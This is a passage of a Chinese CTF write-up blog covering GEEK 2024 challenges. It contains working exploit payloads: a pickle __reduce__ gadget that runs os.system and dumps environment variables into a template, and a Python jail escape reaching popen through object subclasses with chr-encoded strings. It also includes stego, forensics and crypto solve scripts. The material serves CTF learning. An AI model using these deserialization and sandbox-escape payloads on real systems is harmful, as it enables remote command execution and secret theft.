base64</span><br><span class="line"><span class="keyword">import</span> black</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line"><span class="comment">#To Ctfer：给你源码只是给你漏洞点的hint，怎么绕？black.py黑盒，唉无意义</span></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index</span>():</span><br><span class="line">    <span class="keyword">return</span> render_template_string(<span class="built_in">open</span>(<span class="string">&#x27;templates/index.html&#x27;</span>).read())</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/register&#x27;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>, <span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">register</span>():</span><br><span class="line">    <span class="keyword">if</span> request.method == <span class="string">&#x27;POST&#x27;</span>:</span><br><span class="line">        usname = request.form[<span class="string">&#x27;username&#x27;</span>]</span><br><span class="line">        passwd = request.form[<span class="string">&#x27;password&#x27;</span>]</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> usname <span class="keyword">and</span> passwd:</span><br><span class="line">            heart_cookie = secrets.token_hex(<span class="number">32</span>)</span><br><span class="line">            response = make_response(<span class="string">f&quot;Registered successfully with username: <span class="subst">&#123;usname&#125;</span> &lt;br&gt; Now you can go to /login to heal starven&#x27;s heart&quot;</span>)</span><br><span class="line">            response.set_cookie(<span class="string">&#x27;heart&#x27;</span>, heart_cookie)</span><br><span class="line">            <span class="keyword">return</span> response</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span>  render_template(<span class="string">&#x27;register.html&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/login&#x27;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>, <span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">login</span>():</span><br><span class="line">    heart_cookie = request.cookies.get(<span class="string">&#x27;heart&#x27;</span>)</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> heart_cookie:</span><br><span class="line">        <span class="keyword">return</span> render_template(<span class="string">&#x27;warning.html&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> request.method == <span class="string">&#x27;POST&#x27;</span> <span class="keyword">and</span> request.cookies.get(<span class="string">&#x27;heart&#x27;</span>) == heart_cookie:</span><br><span class="line">        statement = request.form[<span class="string">&#x27;statement&#x27;</span>]</span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            heal_state = base64.b64decode(statement)</span><br><span class="line">            <span class="built_in">print</span>(heal_state)</span><br><span class="line">            <span class="keyword">for</span> i <span class="keyword">in</span> black.blacklist:</span><br><span class="line">                <span class="keyword">if</span> i <span class="keyword">in</span> heal_state:</span><br><span class="line">                    <span class="keyword">return</span> render_template(<span class="string">&#x27;waf.html&#x27;</span>)</span><br><span class="line">            pickle.loads(heal_state)</span><br><span class="line">            res = make_response(<span class="string">f&quot;Congratulations! You accomplished the first step of healing Starven&#x27;s broken heart!&quot;</span>)</span><br><span class="line">            flag = os.getenv(<span class="string">&quot;GEEK_FLAG&quot;</span>) <span class="keyword">or</span> os.system(<span class="string">&quot;cat /flag&quot;</span>)</span><br><span class="line">            os.system(<span class="string">&quot;echo &quot;</span> + flag + <span class="string">&quot; &gt; /flag&quot;</span>)</span><br><span class="line">            <span class="keyword">return</span> res</span><br><span class="line">        <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">            <span class="built_in">print</span>( e)</span><br><span class="line">            <span class="keyword">pass</span></span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;Error!!!! give you hint: maybe you can view /starven_s3cret&quot;</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">&#x27;login.html&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/monologue&#x27;</span>,methods=[<span class="string">&#x27;GET&#x27;</span>,<span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">joker</span>():</span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">&#x27;joker.html&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/starven_s3cret&#x27;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>, <span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">secret</span>():</span><br><span class="line">    <span class="keyword">return</span> send_file(__file__,as_attachment=<span class="literal">True</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    app.run(host=<span class="string">&#x27;0.0.0.0&#x27;</span>, port=<span class="number">5000</span>, debug=<span class="literal">False</span>)</span><br></pre></td></tr></table></figure><p>可见是一个pickle注入题目<br>而登录时对starven学长说的话就是需要注入的内容,需要base64加密<br>那么构造如下poc:</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(base64.b64encode(pickle.dumps(<span class="string">&quot;111&quot;</span>)))</span><br><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">aaa</span>():</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__reduce__</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="number">111</span>)</span><br><span class="line">            <span class="keyword">return</span> (<span class="built_in">eval</span>,(<span class="string">&quot;__import__(&#x27;os&#x27;).system(&#x27;xxx&#x27;)&quot;</span>,))</span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            <span class="keyword">pass</span></span><br><span class="line">a = aaa()</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(base64.b64encode(pickle.dumps(a)))</span><br><span class="line"></span><br><span class="line">pickle.loads(base64.b64decode(<span class="string">&quot;gASVOQAAAAAAAACMAm50lIwGc3lzdGVtlJOUjCFlY2hvICIyMjIiPiBmaW5kIC1uYW1lIGpva2VyLmh0bWyUhZRSlC4=&quot;</span>))</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>即可执行任意命令，本想弹shell，结果弹shell的各种方法被过滤，<br>另寻他法后发现index.html的文件位置精确的暴露了，那么我们只要将执行命令的回显写入即可:</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">return</span> (<span class="built_in">eval</span>,(<span class="string">&quot;__import__(&#x27;os&#x27;).system(&#x27;env &gt; templates/index.html&#x27;)&quot;</span>,))</span><br></pre></td></tr></table></figure><p>再回到首页即可成功获得flag</p><h1 id="Truth-of-Word"><a href="#Truth-of-Word" class="headerlink" title="Truth of Word"></a>Truth of Word</h1><p>word文档的真相<br>点进word文档,发现有透明字符，调成红色<br><img src="/2025/03/07/geek2024/word.png"><br>发现外面多了个welcome_TO文件<br>同时文件一直提示要修复，怀疑文件结构里塞东西了<br>翻找发现<code>challenge\word\media</code>下有flag03<br><img src="/2025/03/07/geek2024/flag03.png"><br>最后打开宏代码，找到了flag02<br><img src="/2025/03/07/geek2024/flag02.png"></p><h1 id="雪"><a href="#雪" class="headerlink" title="雪"></a>雪</h1><p>snow隐写<br>上来一个压缩包打不开<br>用记事本在末尾发现一串base64:<code>VzNMQzBNNA==</code><br>解密得:<code>W3LC0M4</code>，作为密码输入成功解压<br>看到一个white.txt文件,显然是now隐写<br>没有密码,但是还有一个盲水印图片<br>使用网上找来的工具解盲水印得到密码:<code>Th1si4st8eK3y</code><br>执行:<br><code>snow.exe -p Th1si4st8eK3y -C White.txt</code><br>成功解密</p><h1 id="doSomeMath"><a href="#doSomeMath" class="headerlink" title="doSomeMath"></a>doSomeMath</h1><p>题目:</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line">white_List=[<span class="string">&quot;+&quot;</span>,<span class="string">&quot;-&quot;</span>,<span class="string">&quot;*&quot;</span>,<span class="string">&quot;/&quot;</span>,<span class="string">&quot;_&quot;</span>,<span class="string">&quot;g&quot;</span>,<span class="string">&quot;e&quot;</span>,<span class="string">&quot;l&quot;</span>,<span class="string">&quot;t&quot;</span>,<span class="string">&quot;(&quot;</span>,<span class="string">&quot;)&quot;</span>,<span class="string">&quot;.&quot;</span>,<span class="string">&quot;,&quot;</span>]</span><br><span class="line">flag=os.environ.get(<span class="string">&quot;GEEK_FLAG&quot;</span>) <span class="keyword">if</span> os.environ.get(<span class="string">&quot;GEEK_FLAG&quot;</span>)!=<span class="literal">None</span> <span class="keyword">else</span> <span class="string">&quot;SYC&#123;test&#125;&quot;</span></span><br><span class="line">banner=<span class="string">&#x27;&#x27;&#x27;     _      ____                       __  __       _   _</span></span><br><span class="line"><span class="string">  __| | ___/ ___|  ___  _ __ ___   ___|  \/  | __ _| |_| |__</span></span><br><span class="line"><span class="string"> / _` |/ _ \___ \ / _ \| &#x27;_ ` _ \ / _ \ |\/| |/ _` | __| &#x27;_ \\</span></span><br><span class="line"><span class="string">| (_| | (_) |__) | (_) | | | | | |  __/ |  | | (_| | |_| | | |</span></span><br><span class="line"><span class="string"> \__,_|\___/____/ \___/|_| |_| |_|\___|_|  |_|\__,_|\__|_| |_|</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">waf</span>(<span class="params">s</span>):</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> s.isascii():</span><br><span class="line">        exit(<span class="string">&quot;Please input ascii&quot;</span>)</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">for</span> word <span class="keyword">in</span> s:</span><br><span class="line">        <span class="keyword">if</span> word <span class="keyword">not</span> <span class="keyword">in</span> white_List:</span><br><span class="line">            exit(<span class="string">&quot;hacker!!!!&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(banner)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;please do this math problem&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        result = <span class="built_in">input</span>(<span class="string">&quot;99*100^60= &quot;</span>)</span><br><span class="line">        waf(result)</span><br><span class="line">        <span class="keyword">if</span> <span class="number">99</span> * <span class="number">100</span> ^ <span class="number">60</span> == <span class="built_in">eval</span>(result):</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;Congradulation!!!!! Here is your reward: &quot;</span> + flag)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;not right&quot;</span>)</span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> err:</span><br><span class="line">        <span class="built_in">print</span>(<span class="built_in">str</span>(err))</span><br></pre></td></tr></table></figure><p>考python原生类魔术方法的使用<br>发现只有gelt四个英文字符可以使用,那么很容易就可以发现:</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">().__le__(())</span><br></pre></td></tr></table></figure><p>可以得到1<br>那么两个加起来就是二，再做平方操作很容易就可以获得任何数，最终payload:</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">(().__le__(()) + ().__le__(()))**13 + (().__le__(()) + ().__le__(()))**10+ (().__le__(()) + ().__le__(()))**9+ (().__le__(()) + ().__le__(()))**7+ (().__le__(()) + ().__le__(()))**4</span><br></pre></td></tr></table></figure><p>得到9872,提交即可</p><h1 id="I-wanna-go-to-SYC"><a href="#I-wanna-go-to-SYC" class="headerlink" title="I_wanna_go_to_SYC"></a>I_wanna_go_to_SYC</h1><p>进入游戏，发现第一个刺都跳不过去<br>但是会生成很多存档文件:<br><img src="/2025/03/07/geek2024/iwanna.png"><br>随便将一个存档文件修改一下，保存再进入游戏<br>发现游戏进入了一个错误的地图，背景就是flag<br>手快截图即可</p><h1 id="cimbar"><a href="#cimbar" class="headerlink" title="cimbar"></a>cimbar</h1><p>libcimbar编码：<br><img src="/2025/03/07/geek2024/cimbar.png"><br><img src="/2025/03/07/geek2024/cimbar2.png"><br>对着对照表一个一个解密,发现第一行是<code>SYC&#123;</code><br>那么就是flag无疑了，将整张图片都decode<br>得到flag</p><h1 id="ez-jpg"><a href="#ez-jpg" class="headerlink" title="ez_jpg"></a>ez_jpg</h1><p>使用010editor打开<br>发现报异常<br>猜测是宽高被修改<br>将宽高都改成640，得到正确图片，获得flag<br><img src="/2025/03/07/geek2024/starven.jpg"></p><h1 id="ez-pcap-1"><a href="#ez-pcap-1" class="headerlink" title="ez_pcap_1"></a>ez_pcap_1</h1><p>流量分析题<br>但是直接使用记事本打开<br>搜索SYC<br>直接找到flag，在明文里<br>属于非预期了</p><h1 id="Welcome-jail"><a href="#Welcome-jail" class="headerlink" title="Welcome_jail"></a>Welcome_jail</h1><p>pyjail</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Please check the blacklist and input your code</span><br><span class="line">[&#x27;import&#x27;, &#x27;os&#x27;, &#x27;breakpoint&#x27;, &#x27;input&#x27;, &#x27;eval&#x27;, &#x27;exec&#x27;, &#x27;help&#x27;, &quot;&#x27;&quot;, &#x27;&quot;&#x27;]</span><br><span class="line">&gt;&gt;</span><br></pre></td></tr></table></figure><p>模仿ssti的做法获得wrap_close:</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="built_in">print</span>(().__class__.__base__.__subclasses__()[<span class="number">132</span>])</span><br></pre></td></tr></table></figure><p>接下来要获取popen,但引号被禁用，不妨用chr绕过,简单写个脚本快速获得payload:</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">s = <span class="built_in">input</span>(<span class="string">&quot;:&quot;</span>)</span><br><span class="line"></span><br><span class="line">r_s = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(s)):</span><br><span class="line">    r_s += <span class="string">f&quot;chr(<span class="subst">&#123;<span class="built_in">ord</span>(s[i])&#125;</span>)+&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(r_s)</span><br></pre></td></tr></table></figure><p>最终在环境变量中得到flag,payload:</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="built_in">print</span>(().__class__.__base__.__subclasses__()[<span class="number">132</span>].__init__.__globals__[<span class="built_in">chr</span>(<span class="number">112</span>)+<span class="built_in">chr</span>(<span class="number">111</span>)+<span class="built_in">chr</span>(<span class="number">112</span>)+<span class="built_in">chr</span>(<span class="number">101</span>)+<span class="built_in">chr</span>(<span class="number">110</span>)](<span class="built_in">chr</span>(<span class="number">101</span>)+<span class="built_in">chr</span>(<span class="number">110</span>)+<span class="built_in">chr</span>(<span class="number">118</span>)).read())</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">SYC&#123;b101c81b-e232-4cdd-98fa-814c03772caa&#125;</span><br></pre></td></tr></table></figure><h1 id="RSA"><a href="#RSA" class="headerlink" title="RSA"></a>RSA</h1><p>脚本如下:</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> long_to_bytes, inverse</span><br><span class="line"></span><br><span class="line"><span class="comment"># 给定参数</span></span><br><span class="line">n = <span class="number">33108009203593648507706487693709965711774665216872550007309537128959455938833</span></span><br><span class="line">p = <span class="number">192173332221883349384646293941837353967</span></span><br><span class="line">q = <span class="number">172282016556631997385463935089230918399</span></span><br><span class="line">e = <span class="number">65537</span></span><br><span class="line">c = <span class="number">5366332878961364744687912786162467698377615956518615197391990327680664213847</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 计算 φ(n)</span></span><br><span class="line">phi_n = (p - <span class="number">1</span>) * (q - <span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 计算私钥 d</span></span><br><span class="line">d = inverse(e, phi_n)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 解密密文</span></span><br><span class="line">m = <span class="built_in">pow</span>(c, d, n)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 转换为字符串</span></span><br><span class="line">flag = long_to_bytes(m)</span><br><span class="line"><span class="built_in">print</span>(flag.decode())</span><br></pre></td></tr></table></figure><h1 id="共模攻击"><a href="#共模攻击" class="headerlink" title="共模攻击"></a>共模攻击</h1><p>脚本如下:</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> libnum</span><br><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"></span><br><span class="line">n= <span class="number">19742875423645690846073637620470497648804310111201409901059297083827103813674034450200432098143959078292346910591785265323563248781526393718834491458926162514713269984791730816121181307827624489725923763353393879316510062227511469438742429290073999388690825732236465647396755899136346150862848924231619666069528077790933176798057396704758072769660663756346237040909579775389576227450505746914753205890194457812893098491264392293949768193694560954874603451253079446652049592976605414438411872223250039782381259212718733455588477129910357095186014496957765297934289263536712574572533650393220492870445376144568199077767</span></span><br><span class="line">c1= <span class="number">18676091924461946809127036439355116782539894105245796626898495935702348484076501694838877829307466429933623102626122909782775514926293363853121828819237500456062111805212209491398720528499589486241208820804465599279152640624618194425740368495072591471531868392274503936869225072123214869399971636428177516761675388589238329574042518038702529606188240859751459632643230538522947412931990009143731829484941397093509641320264169403755707495153433568106934850283614529793695266717330769019091782929139589939928210818515744604847453929432990185347112319971445630830477574679898503825626294542336195240055995445217249602983</span></span><br><span class="line">c2= <span class="number">4229417863231092939788858229435938841085459330992709019823280977891432565586698228613770964563920779991584732527715378842621171338649745186081520176123907689669636473919678398014317024138622949923292787095400632018991311254591786179660603414693984024161009444842277220189315861986306573182865656366278782315864366857374874763243428496061153290565891942968876789905670073321426112497113145141539289020571684634406829272902118484670099097148727072718299512735637087933649345419433312872607209633402427461708181971718804026293074540519907755129917132236240606834816534369171888633588190859475764799895410284484045429152</span></span><br><span class="line">e1e2= <span class="number">911</span>*<span class="number">967</span></span><br><span class="line"> </span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">rsa_gong_N_def</span>(<span class="params">e1,e2,c1,c2,n</span>):  <span class="comment">#共模攻击函数</span></span><br><span class="line">    e1, e2, c1, c2, n=<span class="built_in">int</span>(e1),<span class="built_in">int</span>(e2),<span class="built_in">int</span>(c1),<span class="built_in">int</span>(c2),<span class="built_in">int</span>(n)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;e1,e2:&quot;</span>,e1,e2)</span><br><span class="line">    s = gmpy2.gcdext(e1, e2)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;mpz:&quot;</span>,s)</span><br><span class="line">    s1 = s[<span class="number">1</span>]</span><br><span class="line">    s2 = s[<span class="number">2</span>]</span><br><span class="line">    <span class="keyword">if</span> s1 &lt; <span class="number">0</span>:</span><br><span class="line">        s1 = - s1</span><br><span class="line">        c1 = gmpy2.invert(c1, n)</span><br><span class="line">    <span class="keyword">elif</span> s2 &lt; <span class="number">0</span>:</span><br><span class="line">        s2 = - s2</span><br><span class="line">        c2 = gmpy2.invert(c2, n)</span><br><span class="line">    m = (<span class="built_in">pow</span>(c1,s1,n) * <span class="built_in">pow</span>(c2 ,s2 ,n)) % n</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">int</span>(m)</span><br><span class="line"> </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">de</span>(<span class="params">c, e, n</span>): <span class="comment">#因为此时的m不是真正的m，而是m^k，所以对m^k进行爆破</span></span><br><span class="line">    k = <span class="number">0</span></span><br><span class="line">    <span class="keyword">while</span> k&lt;<span class="number">1000</span>: <span class="comment">#指定k小于1000</span></span><br><span class="line">        mk = c + n*k</span><br><span class="line">        flag, true1 = gmpy2.iroot(mk, e)  <span class="comment">#返回的第一个数值为开方数，第二个数值为布尔型，可整除为true，可自行测试</span></span><br><span class="line">        <span class="keyword">if</span> <span class="literal">True</span> == true1:</span><br><span class="line">            <span class="comment"># print(libnum.n2s(int(flag)))</span></span><br><span class="line">            <span class="keyword">return</span> flag</span><br><span class="line">        k += <span class="number">1</span></span><br><span class="line"><span class="keyword">for</span> e1 <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">2</span>,e1e2):</span><br><span class="line">    <span class="keyword">if</span> e1e2%e1==<span class="number">0</span>:         <span class="comment">#爆破可整除的e</span></span><br><span class="line">        e2=e1e2//e1</span><br><span class="line">        c=rsa_gong_N_def(e1, e2, c1, c2, n)</span><br><span class="line">        e=gmpy2.gcd(e1,e2)</span><br><span class="line">        m1=de(c, e, n)</span><br><span class="line">        <span class="keyword">if</span> m1:  <span class="comment">#指定输出m1</span></span><br><span class="line">            <span class="built_in">print</span>(libnum.n2s(<span class="built_in">int</span>(m1)))</span><br></pre></td></tr></table></figure><h1 id="X0r"><a href="#X0r" class="headerlink" title="X0r"></a>X0r</h1><p>脚本如下:</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> xor</span><br><span class="line"></span><br><span class="line"><span class="comment"># 已知的加密值和预期的 `e2`</span></span><br><span class="line">f1 = <span class="number">4585958212176920650644941909171976689111990</span></span><br><span class="line">f2 = <span class="number">3062959364761961602614252587049328627114908</span></span><br><span class="line">e2_expected = <span class="number">10706859949950921239354880312196039515724907</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 反向计算得到 `enc`</span></span><br><span class="line">e1 = e2_expected ^ f2</span><br><span class="line">enc = e1 ^ f1</span><br><span class="line"></span><br><span class="line"><span class="comment"># 将 `enc` 转换为字节</span></span><br><span class="line">enc_bytes = long_to_bytes(enc)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 假设 flag 以 b&#x27;SYC&#123;&#x27; 开头</span></span><br><span class="line">known_flag_start = <span class="string">b&#x27;SYC&#123;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 计算 `key` 的前四个字节</span></span><br><span class="line">key = xor(enc_bytes[:<span class="number">4</span>], known_flag_start)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;推导出的 key 前四个字节: <span class="subst">&#123;key&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 使用该推导出的 key 前四个字节来解密 `flag`</span></span><br><span class="line">flag = xor(enc_bytes, key)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;解密得到的 flag: <span class="subst">&#123;flag&#125;</span>&quot;</span>)</span><br></pre></td></tr></table></figure><h1 id="ncoCRT"><a href="#ncoCRT" class="headerlink" title="ncoCRT"></a>ncoCRT</h1><p>脚本如下:</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> sympy.ntheory.modular <span class="keyword">import</span> solve_congruence</span><br><span class="line"></span><br><span class="line"><span class="comment"># 给定的 p 和 c</span></span><br><span class="line">p = [<span class="number">1921232050179818686537976490035</span>, <span class="number">2050175089402111328155892746480</span>, <span class="number">1960810970476421389691930930824</span>, <span class="number">1797713136323968089432024221276</span>, <span class="number">2326915607951286191807212748022</span>]</span><br><span class="line">c = [<span class="number">1259284928311091851012441581576</span>, <span class="number">1501691203352712190922548476321</span>, <span class="number">1660842626322200346728249202857</span>, <span class="number">657314037433265072289232145909</span>, <span class="number">2056630082529583499248887436721</span>]</span><br><span class="line"></span><br><span class="line"><span class="comment"># 使用中国剩余定理解</span></span><br><span class="line">congruences = [(ci, pi) <span class="keyword">for</span> ci, pi <span class="keyword">in</span> <span class="built_in">zip</span>(c, p)]</span><br><span class="line">x, _ = solve_congruence(*congruences)</span><br><span class="line"></span><br><span class="line"><span class="comment"># x 是恢复的 m, 转回为 bytes 后得到 flag</span></span><br><span class="line">flag_bytes = long_to_bytes(x)[:-<span class="number">23</span>]  <span class="comment"># 去除多余的填充 \x01</span></span><br><span class="line"><span class="built_in">print</span>(flag_bytes)</span><br><span class="line"></span><br></pre></td></tr></table></figure><h1 id="ecc"><a href="#ecc" class="headerlink" title="ecc"></a>ecc</h1><p>脚本如下:</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> sage.<span class="built_in">all</span> <span class="keyword">import</span> *</span><br><span class="line">p = <span class="number">74997021559434065975272431626618720725838473091721936616560359000648651891507</span></span><br><span class="line">a = <span class="number">61739043730332859978236469007948666997510544212362386629062032094925353519657</span></span><br><span class="line">b = <span class="number">12824761259043751634610094689861000765081341921946160155432001001819005935812</span></span><br><span class="line">k = <span class="number">93653874272176107584459982058527081604083871182797816204772644509623271061231</span></span><br><span class="line">E = EllipticCurve(GF(p),[a,b])</span><br><span class="line">c1 = E([<span class="number">14455613666211899576018835165132438102011988264607146511938249744871964946084</span>,<span class="number">25506582570581289714612640493258299813803157561796247330693768146763035791942</span>])</span><br><span class="line">c2 = E([<span class="number">37554871162619456709183509122673929636457622251880199235054734523782483869931</span>, <span class="number">71392055540616736539267960989304287083629288530398474590782366384873814477806</span>])</span><br><span class="line">cipher_left = <span class="number">68208062402162616009217039034331142786282678107650228761709584478779998734710</span></span><br><span class="line">cipher_right = <span class="number">27453988545002384546706933590432585006240439443312571008791835203660152890619</span></span><br><span class="line">m = c1 - k * c2</span><br><span class="line">left = cipher_left//m[<span class="number">0</span>] </span><br><span class="line">right = cipher_right//m[<span class="number">1</span>] <span class="comment"># 不能转int或Integer型，不然结果为0，不知道为什么，很奇怪</span></span><br><span class="line"><span class="built_in">print</span>(long_to_bytes(<span class="built_in">int</span>(left))+long_to_bytes(<span class="built_in">int</span>(right)))</span><br></pre></td></tr></table></figure><p>本题本地装环境有点麻烦，用的线上测试工具</p><h1 id="dp"><a href="#dp" class="headerlink" title="dp"></a>dp</h1><p>脚本如下</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> gmpy2 <span class="keyword">as</span> gp</span><br><span class="line"></span><br><span class="line">e = <span class="number">65537</span></span><br><span class="line">n = <span class="number">157667866005866043809675592336288962106125998780791920007920833145068421861029354497045918471672956655205541928071253023208751202980457919399456984628429198438149779785543371372206661553180051432786094530268099696823142821724314197245158942206348670703497441629288741715352106143317909146546420870645633338871</span></span><br><span class="line">dp = <span class="number">2509050304161548479367108202753097217949816106531036020623500808413533337006939302155166063392071003278307018323129989037561756887882853296553118973548769</span></span><br><span class="line"></span><br><span class="line">c = <span class="number">127916287434936224964530288403657504450134210781148845328357237956681373722556447001247137686758965891751380034827824922625307521221598031789165449134994998397717982461775225812413476283147124013667777578827293691666320739053915493782515447112364470583788127477537555786778672970196314874316507098162498135060</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,e):                   </span><br><span class="line">    <span class="keyword">if</span>(dp*e-<span class="number">1</span>)%i == <span class="number">0</span>:</span><br><span class="line">        <span class="keyword">if</span> n%(((dp*e-<span class="number">1</span>)//i)+<span class="number">1</span>) == <span class="number">0</span>:   </span><br><span class="line">            p=((dp*e-<span class="number">1</span>)//i)+<span class="number">1</span></span><br><span class="line">            q=n//(((dp*e-<span class="number">1</span>)//i)+<span class="number">1</span>)</span><br><span class="line">            phi=(q-<span class="number">1</span>)*(p-<span class="number">1</span>)            </span><br><span class="line">            d=gp.invert(e,phi)         </span><br><span class="line">            m=<span class="built_in">pow</span>(c,d,n)               </span><br><span class="line">           </span><br><span class="line"><span class="built_in">print</span>(m)                              </span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">bytes</span>.fromhex(<span class="built_in">hex</span>(m)[<span class="number">2</span>:]))</span><br></pre></td></tr></table></figure><h1 id="凯撒加密"><a href="#凯撒加密" class="headerlink" title="凯撒加密"></a>凯撒加密</h1><p>这个我真会，好吧<br>密码题里唯一一道能手搓的</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">caesar_decrypt</span>(<span class="params">ciphertext, shift</span>):</span><br><span class="line">    decrypted = []</span><br><span class="line">    <span class="keyword">for</span> char <span class="keyword">in</span> ciphertext:</span><br><span class="line">        <span class="keyword">if</span> char.isalpha():</span><br><span class="line">            shift_base = <span class="built_in">ord</span>(<span class="string">&#x27;A&#x27;</span>) <span class="keyword">if</span> char.isupper() <span class="keyword">else</span> <span class="built_in">ord</span>(<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">            decrypted_char = <span class="built_in">chr</span>((<span class="built_in">ord</span>(char) - shift_base - shift) % <span class="number">26</span> + shift_base)</span><br><span class="line">            decrypted.append(decrypted_char)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            decrypted.append(char)</span><br><span class="line">    <span class="keyword">return</span> <span 